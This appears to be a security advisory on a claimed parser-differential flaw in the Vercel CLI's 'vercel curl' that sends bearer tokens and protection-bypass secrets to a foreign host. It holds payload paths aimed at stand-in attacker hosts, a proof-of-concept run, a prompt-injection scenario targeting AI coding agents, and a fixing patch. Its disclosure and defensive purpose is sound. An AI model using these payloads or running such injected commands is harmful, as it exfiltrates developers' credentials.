# Vercel CLI (`vercel@65.4.0`) `vercel curl` / `vercel http` WHATWG `URL` vs. `libcurl` Backslash-Userinfo / Brace-Globbing Parser Differential & Unhandled Auto-Mint Error Leaking Live Bearer Token and `x-vercel-protection-bypass` (`VERCEL-CLI-07`)

[English](../41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md) | [Türkçe](../tr/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md) | [日本語](../ja/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md) | **简体中文** | [한국어](../ko/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)

## 1. How the Code Defect Turns Into an Exploitable Vulnerability (Step-by-Step Technical Mechanism)

### Step-by-Step Technical Mechanism
1. **Step 1 — WHATWG `new URL()` vs. `libcurl` (`curl_url_set`) Authority Differential (`packages/cli/src/commands/curl/utils.ts:179-216`):** `constructFullUrl(baseUrl, path)` checks `const url = new URL(path, baseUrl); if (url.origin !== baseUrl) throw ...`, and then returns the **raw string concatenation** `return \`${baseUrl}${normalizedPath}\`` instead of `url.href`. When `path` is `\\@attacker.example/collect` (or `/\\@attacker.example`), WHATWG `new URL()` normalizes `\\` to `/`, seeing `https://my-app.vercel.app/%5C@attacker.example/collect` (`url.origin === baseUrl`). However, the raw string passed to `/usr/bin/curl` is `https://my-app.vercel.app\\@attacker.example/collect`, which `libcurl` parses as username `my-app.vercel.app\\` authenticating to host **`attacker.example`**!
2. **Step 2 — `libcurl` Globbing (`{a,b}`) & `--next` Flag Differential (`utils.ts:34-42`):** When `path` is `@attacker.example/{a,b}`, WHATWG `new URL()` treats `@attacker.example` as a relative path segment, whereas `libcurl`'s URL globbing expands `{a,b}` before authority parsing or processes injected `--next` flags (`extractUrlFromReadNextValue` rejects positional URLs after `--next` but still leaves `curlFlags` containing `--next` followed by `-K` / `--url`).
3. **Step 3 — Automatic Credential Attachment & Unhandled Auto-Mint Bypass Leak (`utils.ts:74-96`):** `vercel curl` automatically attaches `--header "Authorization: Bearer <VERCEL_TOKEN>"` and `x-vercel-protection-bypass: <32-char-secret>` to the `curl` invocation. Additionally, if `client.fetch(\`/v10/projects/${project.id}/protection-bypass\`, { method: 'PATCH' })` fails or returns non-JSON, `ensureProtectionBypassSecret` lacks a `try/catch` around `client.fetch` (`FINDING-07B`).

### Vulnerable Code Snippet
```typescript
// File: packages/cli/src/commands/curl/utils.ts (lines 179-216)
export function constructFullUrl(baseUrl: string, path: string): string {
  const normalizedPath = path.startsWith('/') ? path : `/${path}`;
  const url = new URL(normalizedPath, baseUrl);
  if (url.origin !== baseUrl) {
    throw new Error(`Invalid path "${path}": must be a relative path, not a full URL`);
  }
  // BUG: Returns raw string concatenation instead of normalized url.href, and does not
  // pass '--globoff' to curl! Input '\\@attacker.com/p' passes new URL() origin check
  // but libcurl parses 'baseUrl\\' as userinfo and 'attacker.com' as target host!
  return `${baseUrl}${normalizedPath}`;
}
```

---

## 2. Concrete Everyday Real-World Production Scenarios (`Scenario A` / `Scenario B` / `Scenario C`)

### Scenario A — CI/CD Smoke-Test & PR Preview Health-Check Secret Exfiltration
A GitHub Actions workflow runs `vercel curl "$PREVIEW_PATH" --deployment "$DEPLOYMENT_URL"` where `$PREVIEW_PATH` comes from a PR annotation or smoke-test matrix (`\\@127.0.0.1:41992/exfil`). `constructFullUrl()` validates `url.origin === baseUrl`, but `/usr/bin/curl` connects to `127.0.0.1:41992` and sends `Authorization: Bearer vcp_live_...` and `x-vercel-protection-bypass: 0123456789abcdef0123456789abcdef`.

### Scenario B — Developer Terminal / AI Coding Agent Prompt-Injection Credential Theft
An engineer or AI coding assistant debugging a protected Vercel preview deployment runs a suggested command `vercel curl '\@logs-collector.example/api/debug'`. The developer's live Vercel CLI token and project protection bypass secret are immediately exfiltrated.

### Scenario C — Unscoped Protection Bypass Secret Minting & Unhandled Crash (`FINDING-07B`)
When `project.protectionBypass` is initially empty, `ensureProtectionBypassSecret()` automatically sends `PATCH /v10/projects/{id}/protection-bypass` to mint a persistent project-wide bypass secret and immediately leaks it on the outbound `curl` request.

---

## 3. Example Execution & Verification Commands

```bash
# 1. Inspect constructFullUrl in published vercel@65.4.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/vercel/dist/commands/curl/utils.js | sed -n '1,180p'

# 2. Run the Live vercel@65.4.0 End-to-End Verification Harness against /usr/bin/curl
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-07-cli-curl-flag-and-url-hardening.patch
```

---

## 4. End-to-End Runtime Proof (`RED -> GREEN + BENIGN`) & Defensive Patch

Executed via the Vercel & Next.js Live npm Tarball Verification Suite (see [`vercel-real-world-impact-e2e-20261029.json`](../vercel-real-world-impact-e2e-20261029.json)):

```json
{
  "VERCEL-CLI-07": {
    "RED": {
      "package_tested": "vercel@65.4.0",
      "curl_binary": "/usr/bin/curl 8.5.0",
      "ConstructFullUrl_output": "https://my-protected-deployment.vercel.app/\\@127.0.0.1:38343/exfiltrate",
      "whatwg_origin_check_passed": true,
      "attacker_listener_received_request": true,
      "leaked_authorization": "Bearer vcp_live_SECRET_VERCEL_CLI_TOKEN_998877",
      "leaked_protection_bypass": "0123456789abcdef0123456789abcdef"
    },
    "GREEN": {
      "backslash_and_at_segment_rejected": true,
      "returns_normalized_url_href": true,
      "curl_invoked_with_globoff": true,
      "attacker_listener_received_request": false
    }
  }
}
```

### Unified Diff Patch (`git apply --check` clean)
```diff
--- a/packages/cli/src/commands/curl/utils.ts
+++ b/packages/cli/src/commands/curl/utils.ts
@@ -183,6 +183,9 @@ export function constructFullUrl(baseUrl: string, path: string): string {
+  if (path.includes('\\') || /^\/+@/.test(normalizedPath)) {
+    throw new Error(`Invalid path "${path}": contains ambiguous authority characters`);
+  }
   const url = new URL(normalizedPath, baseUrl);
   if (url.origin !== baseUrl) {
     throw new Error(`Invalid path "${path}": must be a relative path, not a full URL`);
   }
-  return `${baseUrl}${normalizedPath}`;
+  return url.href;
 }
```
